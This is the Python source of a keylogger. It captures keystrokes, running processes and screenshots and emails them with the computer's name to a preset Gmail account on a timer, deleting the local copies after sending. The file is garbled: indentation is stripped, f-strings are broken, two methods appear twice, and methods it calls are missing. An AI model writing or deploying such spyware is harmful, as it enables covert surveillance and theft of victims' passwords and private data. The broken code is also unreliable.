import os
import sys
import keyboard
import psutil
import smtplib
from pyscreenshot
import grab
from email.mime.text
import MIMEText
from email.mime.image
import MIMEImage
from email.mime.multipart
import MIMEMultipart
from email.mime.application
import MIMEApplication
from threading
import Timer
from datetime
import datetime
HOST = f "HOST : {os.environ['COMPUTERNAME']}"
SENDER_EMAIL_ADDRESS = "example@gmail.com"
RECEIVER_EMAIL_ADDRESS = "example@gmail.com"
EMAIL_PASSWORD = "your password"
BODY = f "This message is from client {HOST}'s keylogger Application."
class Keylogger:
    def __init__(self, interval, report_method = "email"): #we gonna pass SEND_REPORT_EVERY to interval
self.interval = interval
self.report_method = report_method# keystrokes, process, screenshots log stored in this variables
self.log = ""
self.process = ""
self.screenshots = []# record start & end datetimes
self.start_dt = datetime.now().strftime('%d-%m-%Y %I:%M:%S')
self.end_dt = datetime.now().strftime('%d-%m-%Y %I:%M:%S')
def update_filename(self):
    start_dt_str = str(self.start_dt).replace(" ", "-").replace(":", "")
end_dt_str = str(self.end_dt).replace(" ", "-").replace(":", "")
self.key_log_filename = f "key_log-{start_dt_str}_{end_dt_str}.txt"
self.process_log_filename = f "process_log-{start_dt_str}_{end_dt_str}.txt"
self.screenshot_filename = f "screenshot-{start_dt_str}_{end_dt_str}.png"

def report_to_file(self):
    with open(self.key_log_filename, "w") as f:
    print(self.log, file = f)
print(f "[+] Saved {self.key_log_filename}")
with open(f "{self.process_log_filename}", "w") as f1:
    print('{:<9} {:<34} {}'.format(
        'PID', 'PROCESS NAME', 'STATUS'), file = f1)
print('{:<9} {:<34} {}'.format(
    '---', '-------------', '------'), file = f1)
print(self.process, file = f1)
print(f "[+] Saved {self.process_log_filename}")
def report_to_mail(self, sender, password, receiver, subject, body, files):
    session = smtplib.SMTP('smtp.gmail.com', 587)
message = MIMEMultipart()
message['From'] = sender
message['To'] = receiver
message['Subject'] = subject
message.attach(MIMEText(body, 'plain'))
self.report_to_file()
attachment = ''
for file in files:
    if file == self.key_log_filename or file == self.process_log_filename:
    attachment = MIMEApplication(
        open(file, "rb").read(), _subtype = "txt")
attachment.add_header(
    'Content-Disposition', 'attachment', filename = file)
else :
    attachment = MIMEImage(open(file, "rb").read(), name = file)
message.attach(attachment)
os.remove(file)
try:
try:
session.starttls()
session.login(sender, password)
session.sendmail(sender, receiver, message.as_string())
print("[+] Report sent to your email address")
except:
    session.login(sender, password)
session.sendmail(sender, receiver, message.as_string())
print("[+] Report sent to your email address")
session.close()
except:
    print('Email NOT sent to %s successfully. %s ERR: %s %s %s ',
        str(receiver), 'tete', str(sys.exc_info()[0]), str(sys.exc_info()[1]),
        str(sys.exc_info()[2]))

def report_to_file(self):
    with open(self.key_log_filename, "w") as f:
    print(self.log, file = f)
print(f "[+] Saved {self.key_log_filename}")
with open(f "{self.process_log_filename}", "w") as f1:
    print('{:<9} {:<34} {}'.format(
        'PID', 'PROCESS NAME', 'STATUS'), file = f1)
print('{:<9} {:<34} {}'.format(
    '---', '-------------', '------'), file = f1)
print(self.process, file = f1)
print(f "[+] Saved {self.process_log_filename}")

def report_to_mail(self, sender, password, receiver, subject, body, files):
    session = smtplib.SMTP('smtp.gmail.com', 587)
message = MIMEMultipart()
message['From'] = sender
message['To'] = receiver
message['Subject'] = subject
message.attach(MIMEText(body, 'plain'))
self.report_to_file()
attachment = ''
for file in files:
    if file == self.key_log_filename or file == self.process_log_filename:
    attachment = MIMEApplication(
        open(file, "rb").read(), _subtype = "txt")
attachment.add_header(
    'Content-Disposition', 'attachment', filename = file)
else :
    attachment = MIMEImage(open(file, "rb").read(), name = file)
message.attach(attachment)
os.remove(file)
try:
try:
session.starttls()
session.login(sender, password)
session.sendmail(sender, receiver, message.as_string())
print("[+] Report sent to your email address")
except:
    session.login(sender, password)
session.sendmail(sender, receiver, message.as_string())
print("[+] Report sent to your email address")
session.close()
except:
    print('Email NOT sent to %s successfully. %s ERR: %s %s %s ',
        str(receiver), 'tete', str(sys.exc_info()[0]), str(sys.exc_info()[1]),
        str(sys.exc_info()[2]))

def report(self):
    self.process_list()
self.screenshot()
if self.log:
    self.end_dt = datetime.now().strftime('%d-%m-%Y %I:%M:%S')
self.update_filename()
print(self.log)
if self.report_method == "email":
    print("---EMAIL METHOD!!!---")
files = [self.key_log_filename,
    self.process_log_filename
]
files.extend(self.screenshots)
self.report_to_mail(
    sender = SENDER_EMAIL_ADDRESS,
    password = EMAIL_PASSWORD,
    receiver = RECEIVER_EMAIL_ADDRESS,
    subject = HOST,
    body = BODY,
    files = files
)
self.screenshots = []
elif self.report_method == "file":
    print("---SYSTEM STORAGE METHOD!!!---")
self.report_to_file()
self.start_dt = datetime.now().strftime('%d-%m-%Y%I:%M:%S')
self.log = ""
self.process = ""
timer = Timer(interval = self.interval, function = self.report)
timer.daemon = True
timer.start()
def start(self): #record the start datetime
self.start_dt = datetime.now().strftime('%d-%m-%Y %I:%M:%S')# start the keylogger
print("Keylogger started...")
keyboard.on_release(callback = self.callback)# start reporting the keylogs
self.report()
